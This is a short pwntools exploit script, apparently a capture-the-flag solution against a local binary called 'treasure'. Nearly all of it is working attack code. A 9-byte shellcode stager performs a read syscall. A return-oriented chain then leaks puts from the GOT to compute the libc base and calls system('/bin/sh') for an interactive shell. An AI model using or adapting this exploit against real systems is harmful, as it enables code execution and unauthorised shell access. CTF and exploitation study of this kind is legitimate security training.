from pwn import *

p = process('./treasure')
elf = ELF('treasure')
libc = ELF('libc.so')
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

def conti(sd,nine_code) :
    p.recvuntil('will you continue?(enter \'n\' to quit) :')
    p.sendline(sd)
    p.recvuntil('start!!!!')
    p.send(nine_code)

payload = asm('push rsp') + asm('pop rsi')
payload += asm('mov edx,esi') + asm('syscall')
payload = payload.ljust(9,'\x90')
#gdb.attach(p)
conti('A',payload)

pop_rdi = 0x400b83
main_addr = 0x4009BA
payload2 = p64(pop_rdi) + p64(elf.got['puts'])
payload2 += p64(elf.plt['puts']) + p64(main_addr)
p.send(payload2)

data = u64(p.recv(6).ljust(8,'\x00'))
log.success('puts\'s addr :'+hex(data))
base = data - libc.symbols['puts']
system_addr = base + libc.symbols['system']
bin_addr = base + libc.search('/bin/sh').next()

payload3 = asm('push rsp') + asm('pop rsi')
payload3 += asm('mov edx,esi') + asm('syscall')
payload3 = payload3.ljust(9,'\x90')
#gdb.attach(p)
conti('B',payload3)

payload4 = p64(pop_rdi) + p64(bin_addr) + p64(system_addr)
p.send(payload4)

p.interactive()
